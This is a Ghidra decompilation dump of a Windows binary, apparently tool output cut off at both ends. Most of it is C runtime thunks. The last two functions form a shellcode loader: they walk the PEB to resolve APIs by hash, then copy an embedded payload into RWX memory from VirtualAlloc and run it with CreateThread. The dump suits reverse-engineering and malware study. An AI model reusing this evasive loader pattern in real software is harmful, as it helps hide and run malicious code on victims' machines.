        pauVar15 = (undefined1 (*) [10])*param_5;
        uVar4 = local_70 | 0x20;
        uVar10 = local_70 & 4;
        local_70 = uVar4;
        if (uVar10 == 0) goto LAB_140004708;
LAB_140004533:
        local_a8[0] = *pauVar15;
        FUN_140003940(local_a8,&local_78);
        goto LAB_140004510;
      case 0x67:
        pauVar15 = (undefined1 (*) [10])*param_5;
        uVar4 = local_70 | 0x20;
        uVar10 = local_70 & 4;
        local_70 = uVar4;
        if (uV
/* Ghidra output truncated by AIDebug safety limit */

/* ================================================================== */
/* Function sub_140007390 at 0x140007390 */
/* Backend: ghidra; language: c-like */

void FUN_140007390(FILE *param_1)

{
  FILE *pFVar1;
  
  pFVar1 = FUN_140007480(0);
  if (pFVar1 <= param_1) {
    pFVar1 = FUN_140007480(0x13);
    if (param_1 <= pFVar1) {
      pFVar1 = FUN_140007480(0);
      _lock((int)((longlong)param_1 - (longlong)pFVar1 >> 4) * -0x55555555 + 0x10);
      param_1->_flag = param_1->_flag | 0x8000;
      return;
    }
  }
                    /* WARNING: Could not recover jumptable at 0x0001400073bc. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  EnterCriticalSection((LPCRITICAL_SECTION)(param_1 + 1));
  return;
}

/* ================================================================== */
/* Function sub_140007400 at 0x140007400 */
/* Backend: ghidra; language: c-like */

void FUN_140007400(FILE *param_1)

{
  FILE *pFVar1;
  
  pFVar1 = FUN_140007480(0);
  if (pFVar1 <= param_1) {
    pFVar1 = FUN_140007480(0x13);
    if (param_1 <= pFVar1) {
      param_1->_flag = param_1->_flag & 0xffff7fff;
      pFVar1 = FUN_140007480(0);
      _unlock((int)((longlong)param_1 - (longlong)pFVar1 >> 4) * -0x55555555 + 0x10);
      return;
    }
  }
                    /* WARNING: Could not recover jumptable at 0x00014000742c. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  LeaveCriticalSection((LPCRITICAL_SECTION)(param_1 + 1));
  return;
}

/* ================================================================== */
/* Function sub_140007470 at 0x140007470 */
/* Backend: ghidra; language: c-like */

undefined8 FUN_140007470(undefined8 param_1)

{
  undefined8 uVar1;
  
  uVar1 = DAT_14000cb60;
  LOCK();
  DAT_14000cb60 = param_1;
  UNLOCK();
  return uVar1;
}

/* ================================================================== */
/* Function sub_140007480 at 0x140007480 */
/* Backend: ghidra; language: c-like */

FILE * FUN_140007480(uint param_1)

{
  FILE *pFVar1;
  
  pFVar1 = __iob_func();
  return pFVar1 + param_1;
}

/* ================================================================== */
/* Function sub_1400079d0 at 0x1400079d0 */
/* Backend: ghidra; language: c-like */

FILE * __cdecl __iob_func(void)

{
  FILE *pFVar1;
  
                    /* WARNING: Could not recover jumptable at 0x0001400079d0. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  pFVar1 = __iob_func();
  return pFVar1;
}

/* ================================================================== */
/* Function sub_1400079e8 at 0x1400079e8 */
/* Backend: ghidra; language: c-like */

void __cdecl _amsg_exit(int param_1)

{
                    /* WARNING: Could not recover jumptable at 0x0001400079e8. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  _amsg_exit(param_1);
  return;
}

/* ================================================================== */
/* Function sub_1400079f0 at 0x1400079f0 */
/* Backend: ghidra; language: c-like */

void __cdecl _cexit(void)

{
                    /* WARNING: Could not recover jumptable at 0x0001400079f0. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  _cexit();
  return;
}

/* ================================================================== */
/* Function sub_1400079f8 at 0x1400079f8 */
/* Backend: ghidra; language: c-like */

int * __cdecl _errno(void)

{
  int *piVar1;
  
                    /* WARNING: Could not recover jumptable at 0x0001400079f8. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  piVar1 = _errno();
  return piVar1;
}

/* ================================================================== */
/* Function sub_140007a00 at 0x140007a00 */
/* Backend: ghidra; language: c-like */

void _initterm(void)

{
                    /* WARNING: Could not recover jumptable at 0x000140007a00. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  _initterm();
  return;
}

/* ================================================================== */
/* Function sub_140007a08 at 0x140007a08 */
/* Backend: ghidra; language: c-like */

void __cdecl _lock(int _File)

{
                    /* WARNING: Could not recover jumptable at 0x000140007a08. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  _lock(_File);
  return;
}

/* ================================================================== */
/* Function sub_140007a10 at 0x140007a10 */
/* Backend: ghidra; language: c-like */

_onexit_t __cdecl _onexit(_onexit_t _Func)

{
  _onexit_t p_Var1;
  
                    /* WARNING: Could not recover jumptable at 0x000140007a10. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  p_Var1 = _onexit(_Func);
  return p_Var1;
}

/* ================================================================== */
/* Function sub_140007a20 at 0x140007a20 */
/* Backend: ghidra; language: c-like */

void __cdecl abort(void)

{
                    /* WARNING: Could not recover jumptable at 0x000140007a20. Too many branches */
                    /* WARNING: Subroutine does not return */
                    /* WARNING: Treating indirect jump as call */
  abort();
  return;
}

/* ================================================================== */
/* Function sub_140007a30 at 0x140007a30 */
/* Backend: ghidra; language: c-like */

void __cdecl exit(int _Code)

{
                    /* WARNING: Could not recover jumptable at 0x000140007a30. Too many branches */
                    /* WARNING: Subroutine does not return */
                    /* WARNING: Treating indirect jump as call */
  exit(_Code);
  return;
}

/* ================================================================== */
/* Function sub_140007a40 at 0x140007a40 */
/* Backend: ghidra; language: c-like */

int __cdecl fputc(int _Ch,FILE *_File)

{
  int iVar1;
  
                    /* WARNING: Could not recover jumptable at 0x000140007a40. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  iVar1 = fputc(_Ch,_File);
  return iVar1;
}

/* ================================================================== */
/* Function sub_140007a50 at 0x140007a50 */
/* Backend: ghidra; language: c-like */

size_t __cdecl fwrite(void *_Str,size_t _Size,size_t _Count,FILE *_File)

{
  size_t sVar1;
  
                    /* WARNING: Could not recover jumptable at 0x000140007a50. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  sVar1 = fwrite(_Str,_Size,_Count,_File);
  return sVar1;
}

/* ================================================================== */
/* Function sub_140007a60 at 0x140007a60 */
/* Backend: ghidra; language: c-like */

void * __cdecl malloc(size_t _Size)

{
  void *pvVar1;
  
                    /* WARNING: Could not recover jumptable at 0x000140007a60. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  pvVar1 = malloc(_Size);
  return pvVar1;
}

/* ================================================================== */
/* Function sub_140007a68 at 0x140007a68 */
/* Backend: ghidra; language: c-like */

void * __cdecl memcpy(void *_Dst,void *_Src,size_t _Size)

{
  void *pvVar1;
  
                    /* WARNING: Could not recover jumptable at 0x000140007a68. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  pvVar1 = memcpy(_Dst,_Src,_Size);
  return pvVar1;
}

/* ================================================================== */
/* Function sub_140007a88 at 0x140007a88 */
/* Backend: ghidra; language: c-like */

size_t __cdecl strlen(char *_Str)

{
  size_t sVar1;
  
                    /* WARNING: Could not recover jumptable at 0x000140007a88. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  sVar1 = strlen(_Str);
  return sVar1;
}

/* ================================================================== */
/* Function sub_140007a98 at 0x140007a98 */
/* Backend: ghidra; language: c-like */

int __cdecl vfprintf(FILE *_File,char *_Format,va_list _ArgList)

{
  int iVar1;
  
                    /* WARNING: Could not recover jumptable at 0x000140007a98. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  iVar1 = vfprintf(_File,_Format,_ArgList);
  return iVar1;
}

/* ================================================================== */
/* Function sub_140007b80 at 0x140007b80 */
/* Backend: ghidra; language: c-like */

void FUN_140007b80(byte *param_1,ulonglong param_2,undefined8 param_3,undefined8 param_4)

{
  FILE *pFVar1;
  ulonglong local_res10;
  undefined8 local_res18;
  undefined8 local_res20;
  
  local_res10 = param_2;
  local_res18 = param_3;
  local_res20 = param_4;
  pFVar1 = (FILE *)(*(code *)PTR_FUN_1400080b0)(1);
  FUN_1400024f0(pFVar1,param_1,&local_res10);
  return;
}

/* ================================================================== */
/* Function sub_140007bd0 at 0x140007bd0 */
/* Backend: ghidra; language: c-like */

longlong FUN_140007bd0(longlong param_1,uint param_2,undefined8 param_3,undefined8 param_4)

{
  char cVar1;
  uint uVar2;
  uint uVar3;
  size_t sVar4;
  uint uVar5;
  char *pcVar6;
  longlong lVar7;
  ulonglong uVar8;
  char *_Str;
  
  lVar7 = (ulonglong)*(uint *)(param_1 + 0x88 + (longlong)*(int *)(param_1 + 0x3c)) + param_1;
  uVar2 = *(uint *)(lVar7 + 0x1c);
  uVar3 = *(uint *)(lVar7 + 0x20);
  if (uVar2 != 0) {
    uVar8 = 0;
    do {
      _Str = (char *)((ulonglong)*(uint *)(param_1 + (ulonglong)uVar3 + uVar8 * 4) + param_1);
      sVar4 = strlen(_Str);
      if (sVar4 != 0) {
        uVar5 = 0x35;
        pcVar6 = _Str;
        do {
          cVar1 = *pcVar6;
          pcVar6 = pcVar6 + 1;
          uVar5 = (int)cVar1 + uVar5 * 3;
        } while (_Str + sVar4 != pcVar6);
        if (param_2 == uVar5) {
          uVar3 = *(uint *)(lVar7 + 0x24);
          FUN_140007b80((byte *)"successfully found! %s - %d\n",(ulonglong)_Str,(ulonglong)param_2,
                        param_4);
          return (ulonglong)
                 *(uint *)(param_1 + (ulonglong)*(ushort *)(param_1 + uVar8 * 2 + (ulonglong)uVar3)
                                     * 4 + (ulonglong)uVar2) + param_1;
        }
      }
      uVar8 = uVar8 + 1;
    } while (uVar8 != uVar2);
  }
  return 0;
}

/* ================================================================== */
/* Function sub_140007c90 at 0x140007c90 */
/* Backend: ghidra; language: c-like */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

undefined8 FUN_140007c90(undefined8 param_1,undefined8 param_2,LPSTR param_3,undefined8 param_4)

{
  char cVar1;
  short sVar2;
  longlong *plVar3;
  short *psVar4;
  LPSTR _Str;
  size_t sVar5;
  code *pcVar6;
  code *pcVar7;
  undefined8 uVar8;
  code *pcVar9;
  undefined8 *puVar10;
  longlong lVar11;
  int iVar12;
  ulonglong uVar13;
  undefined8 *puVar14;
  longlong *plVar15;
  undefined8 *puVar16;
  longlong unaff_GS_OFFSET;
  CHAR local_68 [72];
  
  FUN_140001500();
  plVar3 = *(longlong **)(*(longlong *)(*(longlong *)(unaff_GS_OFFSET + 0x60) + 0x18) + 0x18);
  plVar15 = plVar3;
  do {
    plVar15 = (longlong *)*plVar15;
    if (plVar15[6] != 0) {
      psVar4 = (short *)plVar15[0xc];
      lVar11 = 0;
      param_3 = local_68;
      sVar2 = *psVar4;
      if (sVar2 != 0) {
        do {
          param_3[lVar11] = (CHAR)sVar2;
          lVar11 = lVar11 + 1;
          sVar2 = psVar4[lVar11];
          if (sVar2 == 0) break;
        } while (lVar11 != 0x3f);
      }
      local_68[lVar11] = '\0';
      _Str = CharLowerA(param_3);
      sVar5 = strlen(_Str);
      if (sVar5 != 0) {
        param_3 = _Str + sVar5;
        iVar12 = 0x35;
        do {
          cVar1 = *_Str;
          _Str = _Str + 1;
          iVar12 = (int)cVar1 + iVar12 * 3;
        } while (_Str != param_3);
        if (iVar12 == 0x35c206b) break;
      }
    }
  } while (plVar15 != plVar3);
  lVar11 = plVar15[6];
  pcVar6 = (code *)FUN_140007bd0(lVar11,0xf0b03804,param_3,param_4);
  pcVar7 = (code *)FUN_140007bd0(lVar11,0x1ac1e8e1,param_3,param_4);
  uVar8 = (*pcVar6)("kernel32.dll");
  pcVar6 = (code *)(*pcVar7)(uVar8,"VirtualAlloc");
  pcVar9 = (code *)(*pcVar7)(uVar8,"CreateThread");
  pcVar7 = (code *)(*pcVar7)(uVar8,"WaitForSingleObject");
  puVar10 = (undefined8 *)(*pcVar6)(0,0x13a,0x3000,0x40);
  *puVar10 = DAT_1400080c0;
  *(undefined8 *)((longlong)puVar10 + 0x132) = _s________1400081f2;
  lVar11 = (longlong)puVar10 - (longlong)((ulonglong)(puVar10 + 1) & 0xfffffffffffffff8);
  puVar14 = (undefined8 *)((longlong)&DAT_1400080c0 - lVar11);
  puVar16 = (undefined8 *)((ulonglong)(puVar10 + 1) & 0xfffffffffffffff8);
  for (uVar13 = (ulonglong)((int)lVar11 + 0x13aU >> 3); uVar13 != 0; uVar13 = uVar13 - 1) {
    *puVar16 = *puVar14;
    puVar14 = puVar14 + 1;
    puVar16 = puVar16 + 1;
  }
  uVar8 = (*pcVar9)(0,0,puVar10,0,0,0);
  (*pcVar7)(uVar8,0xffffffff);
  return 0;
}
